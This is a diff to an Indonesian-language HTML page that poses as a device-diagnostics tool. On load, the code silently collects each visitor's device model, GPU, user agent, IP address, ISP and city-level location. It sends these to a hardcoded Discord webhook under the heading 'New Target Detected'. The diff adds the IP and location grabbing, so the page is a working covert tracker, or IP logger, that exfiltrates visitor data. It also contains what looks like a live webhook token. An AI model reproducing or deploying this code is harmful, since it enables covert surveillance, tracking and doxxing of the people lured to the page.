@@ -3,100 +3,143 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Informasi Perangkat</title>
+    <title>Sistem Diagnosa Perangkat</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; margin: 0; padding: 20px; display: flex; justify-content: center; }
-        .card { background: #1e293b; padding: 25px; border-radius: 15px; width: 100%; max-width: 500px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h2 { color: #38bdf8; text-align: center; margin-bottom: 20px; }
-        .info-box { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #38bdf8; }
-        .label { color: #94a3b8; font-size: 11px; text-transform: uppercase; font-weight: bold; display: block; margin-bottom: 4px; }
-        .value { color: #f1f5f9; font-size: 14px; word-break: break-all; line-height: 1.5; display: block; }
-        .status-tag { text-align: center; padding: 8px; border-radius: 5px; font-size: 12px; margin-top: 10px; font-weight: bold; }
-        .success { background: #065f46; color: #34d399; }
-        .pending { background: #854d0e; color: #fde047; }
+        body { font-family: 'Inter', -apple-system, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; display: flex; justify-content: center; }
+        .card { background: #1e293b; padding: 25px; border-radius: 16px; width: 100%; max-width: 480px; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1); border: 1px solid #334155; }
+        h2 { color: #38bdf8; text-align: center; margin-top: 0; font-size: 20px; }
+        .info-group { background: #0f172a; padding: 12px; border-radius: 8px; margin-bottom: 12px; border-left: 4px solid #38bdf8; }
+        .label { color: #64748b; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; font-weight: 800; display: block; margin-bottom: 4px; }
+        .value { color: #e2e8f0; font-size: 14px; word-break: break-all; font-weight: 500; display: block; line-height: 1.4; }
+        .status { text-align: center; padding: 10px; border-radius: 8px; font-size: 12px; font-weight: bold; margin-top: 15px; }
+        .success { background: #064e3b; color: #34d399; }
+        .loading { background: #451a03; color: #fbbf24; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>Device Identifier</h2>
+    <h2>Device Intelligence</h2>
     
-    <div class="info-box">
-        <span class="label">Merk & Nama Produk</span>
-        <span id="brand-out" class="value">Mendeteksi...</span>
+    <div class="info-group">
+        <span class="label">Brand & Nama Produk</span>
+        <span id="ui-product" class="value">Mendeteksi...</span>
     </div>
 
-    <div class="info-box">
+    <div class="info-group">
         <span class="label">Model Hardware</span>
-        <span id="model-out" class="value">Mencari...</span>
+        <span id="ui-model" class="value">Mencari...</span>
     </div>
 
-    <div class="info-box">
+    <div class="info-group">
+        <span class="label">Alamat IP & ISP</span>
+        <span id="ui-network" class="value">Menghubungkan...</span>
+    </div>
+
+    <div class="info-group">
+        <span class="label">Lokasi (Alamat)</span>
+        <span id="ui-location" class="value">Melacak...</span>
+    </div>
+
+    <div class="info-group">
         <span class="label">Chipset (GPU)</span>
-        <span id="gpu-out" class="value">Menganalisis...</span>
+        <span id="ui-gpu" class="value">Menganalisis...</span>
     </div>
 
-    <div class="info-box">
+    <div class="info-group">
         <span class="label">User Agent</span>
-        <span id="ua-out" class="value">Memuat...</span>
+        <span id="ui-ua" class="value">Memuat...</span>
     </div>
 
-    <div id="status" class="status-tag pending">Menghubungkan ke Webhook...</div>
+    <div id="status" class="status loading">⚙️ Sedang Memproses Data...</div>
 </div>
 
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";
 
-    async function getDeviceInfo() {
-        let data = {
-            brand: "Android/Generic",
-            model: "Unknown",
-            productName: "Smartphone",
+    // Fungsi mapping model ke Nama Produk (Bisa kamu tambah sendiri)
+    function mapModelToName(model) {
+        const db = {
+            'SM-A546': 'Samsung Galaxy A54 5G',
+            'SM-G991': 'Samsung Galaxy S21',
+            'SM-S918': 'Samsung Galaxy S23 Ultra',
+            'CPH2387': 'OPPO A57',
+            'CPH2477': 'OPPO A17',
+            'RMX3511': 'Realme C35',
+            'M2101K7BN': 'Redmi Note 10S',
+            'iPhone14,5': 'iPhone 13',
+            'iPhone15,3': 'iPhone 14 Pro Max'
+        };
+        for (let key in db) {
+            if (model.includes(key)) return db[key];
+        }
+        return "Android Generic (" + model + ")";
+    }
+
+    async function startCapture() {
+        let device = {
+            model: "K (Hidden)",
+            product: "Smartphone",
+            ip: "Unknown",
+            isp: "Unknown",
+            loc: "Unknown",
             gpu: "N/A",
             ua: navigator.userAgent
         };
 
-        // 1. Get GPU (Chipset Info)
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
+        // 1. Ambil GPU
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Generic GPU";
-        }
+            device.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Generic GPU";
+        } catch(e) {}
 
-        // 2. Get Model & Brand (Modern Way)
+        // 2. Ambil Model
         if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-            const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
-            data.model = hints.model || "K";
-            data.brand = hints.platform || "Android";
+            const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
+            device.model = hints.model || "K";
+        }
+        device.product = mapModelToName(device.model);
+
+        // 3. Ambil IP, ISP, & Lokasi (Paling Penting)
+        try {
+            const res = await fetch('http://googleusercontent.com/ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query');
+            const n = await res.json();
+            if(n.status === 'success') {
+                device.ip = n.query;
+                device.isp = n.isp;
+                device.loc = `${n.city}, ${n.regionName}, ${n.country} (${n.zip})`;
+            }
+        } catch(e) {
+            device.ip = "Gagal (Blokir Browser)";
         }
 
-        // 3. Nama Produk (Sederhana - Bisa ditambah listnya)
-        if (data.model.includes("SM-G991")) data.productName = "Samsung Galaxy S21";
-        else if (data.model.includes("SM-A546")) data.productName = "Samsung Galaxy A54";
-        else if (data.model.includes("CPH")) data.productName = "OPPO Perangkat";
-        else if (data.model !== "Unknown") data.productName = "Android " + data.model;
+        // Tampilkan di UI
+        document.getElementById('ui-product').innerText = device.product;
+        document.getElementById('ui-model').innerText = device.model;
+        document.getElementById('ui-network').innerText = `${device.ip} / ${device.isp}`;
+        document.getElementById('ui-location').innerText = device.loc;
+        document.getElementById('ui-gpu').innerText = device.gpu;
+        document.getElementById('ui-ua').innerText = device.ua;
 
-        // Update UI
-        document.getElementById('brand-out').innerText = data.productName;
-        document.getElementById('model-out').innerText = data.model;
-        document.getElementById('gpu-out').innerText = data.gpu;
-        document.getElementById('ua-out').innerText = data.ua;
-
-        sendToDiscord(data);
+        // 4. Kirim ke Discord
+        sendToDiscord(device);
     }
 
     function sendToDiscord(d) {
         const payload = {
-            username: "System Spyder",
+            content: "🔔 **Target Baru Terdeteksi!**",
             embeds: [{
-                title: "📱 Perangkat Terdeteksi",
-                color: 5814783,
+                title: "Detail Perangkat Target",
+                color: 2303786,
                 fields: [
-                    { name: "Nama Produk", value: d.productName, inline: true },
-                    { name: "Model", value: d.model, inline: true },
-                    { name: "GPU", value: d.gpu, inline: false },
-                    { name: "User Agent", value: "```" + d.ua + "```" }
+                    { name: "📱 Produk", value: d.product, inline: true },
+                    { name: "🆔 Model", value: d.model, inline: true },
+                    { name: "🌐 IP / ISP", value: `${d.ip}\n${d.isp}`, inline: false },
+                    { name: "📍 Alamat", value: d.loc, inline: false },
+                    { name: "🎮 GPU", value: d.gpu, inline: false },
+                    { name: "📄 UA", value: "```" + d.ua + "```" }
                 ],
                 timestamp: new Date()
             }]
@@ -106,18 +149,15 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
-        })
-        .then(() => {
-            document.getElementById('status').innerText = "✓ Data Terkirim";
-            document.getElementById('status').className = "status-tag success";
-        })
-        .catch(() => {
-            document.getElementById('status').innerText = "✗ Webhook Gagal";
-            document.getElementById('status').className = "status-tag error";
+        }).then(() => {
+            document.getElementById('status').innerText = "✅ Data Berhasil Disinkronkan";
+            document.getElementById('status').className = "status success";
+        }).catch(() => {
+            document.getElementById('status').innerText = "⚠️ Gangguan Koneksi Webhook";
         });
     }
 
-    window.onload = getDeviceInfo;
+    window.onload = startCapture;
 </script>
 
 </body>
